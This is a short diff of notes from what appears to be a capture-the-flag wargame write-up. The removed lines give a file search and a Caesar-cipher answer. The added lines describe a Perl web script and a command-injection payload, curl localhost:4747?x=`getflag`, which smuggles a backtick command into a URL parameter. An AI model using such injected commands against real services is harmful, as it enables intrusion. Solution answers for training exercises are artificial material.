@@ -1,5 +1,4 @@
-find / -user flag00 2>/dev/null
+# We have a Perl script
+# When run permit to query wth curl localhost:4747 with a param x and \`\`as command sub
 
-find all file owned by user flag00, redirect bad result in /dev/null
-
-Code : cdiiddwpgswtgt, brutforce cesar code, it's 15 -> "nottoohardhere"
+curl localhost:4747?x=\`getflag\`
